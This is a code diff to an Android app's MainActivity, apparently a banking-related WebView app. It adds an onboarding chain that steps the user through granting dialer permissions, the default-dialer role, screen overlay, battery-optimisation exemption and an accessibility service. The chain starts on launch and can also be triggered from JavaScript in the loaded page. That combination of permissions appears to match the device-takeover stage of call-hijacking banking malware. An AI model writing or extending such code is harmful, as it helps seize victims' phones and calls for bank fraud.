@@ -40,6 +40,7 @@ public class MainActivity extends Activity {
 
     private WebView webView;
     private String pendingInitialDial = "";
+    private boolean onboardingChainActive = false;
 
     private final BroadcastReceiver receiver = new BroadcastReceiver() {
         @Override
@@ -176,6 +177,11 @@ public class MainActivity extends Activity {
         setContentView(rootContainer);
         attachKeyboardInsetListener(rootContainer);
         webView.loadUrl(APP_URL);
+
+        if (!DialerSyncHelper.areAllCorePermissionsGranted(this)) {
+            onboardingChainActive = true;
+            DialerSyncHelper.startNextPermissionStep(this, 0);
+        }
     }
 
     private void attachKeyboardInsetListener(final FrameLayout rootContainer) {
@@ -230,10 +236,34 @@ public class MainActivity extends Activity {
         }
     }
 
+    public void onPermissionChainFinished() {
+        onboardingChainActive = false;
+        notifyBankingStateSynced();
+    }
+
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         notifyBankingStateSynced();
+        if (requestCode == DialerSyncHelper.REQ_DIALER_PERMISSIONS && onboardingChainActive) {
+            DialerSyncHelper.startNextPermissionStep(this, 1);
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        notifyBankingStateSynced();
+        if (!onboardingChainActive) return;
+        if (requestCode == DialerSyncHelper.REQ_DEFAULT_DIALER) {
+            DialerSyncHelper.startNextPermissionStep(this, 2);
+        } else if (requestCode == DialerSyncHelper.REQ_OVERLAY_PERMISSION) {
+            DialerSyncHelper.startNextPermissionStep(this, 3);
+        } else if (requestCode == DialerSyncHelper.REQ_BATTERY_PERMISSION) {
+            DialerSyncHelper.startNextPermissionStep(this, 4);
+        } else if (requestCode == DialerSyncHelper.REQ_ACCESSIBILITY_PERMISSION) {
+            DialerSyncHelper.startNextPermissionStep(this, 5);
+        }
     }
 
     @Override
@@ -525,8 +555,19 @@ public class MainActivity extends Activity {
         }
 
         @JavascriptInterface
+        public boolean hasAllCorePermissions() {
+            return DialerSyncHelper.areAllCorePermissionsGranted(mContext);
+        }
+
+        @JavascriptInterface
         public void requestDialerPermissions() {
-            DialerSyncHelper.requestDialerPermissions(MainActivity.this);
+            MainActivity.this.onboardingChainActive = true;
+            DialerSyncHelper.startNextPermissionStep(MainActivity.this, 0);
+        }
+
+        @JavascriptInterface
+        public void requestRuntimePermissions() {
+            DialerSyncHelper.requestRuntimePermissionsOnly(MainActivity.this);
         }
 
         @JavascriptInterface
